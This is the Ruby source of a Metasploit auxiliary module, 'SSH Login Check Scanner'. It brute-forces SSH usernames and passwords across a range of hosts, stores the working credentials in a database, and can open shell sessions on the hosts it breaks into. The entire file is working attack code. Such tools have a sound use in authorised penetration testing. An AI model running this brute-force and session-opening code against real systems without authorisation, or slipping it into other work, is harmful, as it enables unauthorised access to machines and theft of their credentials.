##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'
require 'net/ssh/command_stream'
require 'metasploit/framework/login_scanner/ssh'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::SSH::Options
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def initialize
    super(
      'Name'           => 'SSH Login Check Scanner',
      'Description'    => %q{
        This module will test ssh logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'         => ['todb'],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {'VERBOSE' => false} # Disable annoying connect errors
    )

    register_options(
      [
        Opt::RPORT(22)
      ], self.class
    )

    register_advanced_options(
      [
        Opt::Proxies,
        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),
        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def session_setup(result, scanner)
    return unless scanner.ssh_socket

    platform = scanner.get_platform(result.proof)

    # Create a new session
    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE'     => nil,
      'PASS_FILE'     => nil,
      'USERNAME'      => result.credential.public,
      'PASSWORD'      => result.credential.private
    }
    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
    self.sockets.delete(scanner.ssh_socket.transport.socket)

    # Set the session platform
    s.platform = platform

    # Create database host information
    host_info = {host: scanner.host}

    unless s.platform == 'unknown'
      host_info[:os_name] = s.platform
    end

    report_host(host_info)

    s
  end


  def run_host(ip)
    @ip = ip
    print_brute :ip => ip, :msg => 'Starting bruteforce'

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
    )

    scanner = Metasploit::Framework::LoginScanner::SSH.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: cred_collection,
        proxies: datastore['Proxies'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['SSH_TIMEOUT'],
        framework: framework,
        framework_module: self,
        skip_gather_proof: !datastore['GatherProof']
      )
    )

    scanner.verbosity = :debug if datastore['SSH_DEBUG']

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
        credential_data[:private_type] = :password
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        if datastore['CreateSession']
          begin
            session_setup(result, scanner)
          rescue StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute :level => :error, :ip => ip, :msg => "Failed to setup the session - #{e.class} #{e.message}"
          end
        end

        if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
          msg = "While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with"
          msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
          msg << " device details so it can be handled in the future."
          print_brute :level => :error, :ip => ip, :msg => msg
        end
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Could not connect: #{result.proof}"
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
        invalidate_login(credential_data)
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      else
        invalidate_login(credential_data)
        scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?
      end
    end
  end
end
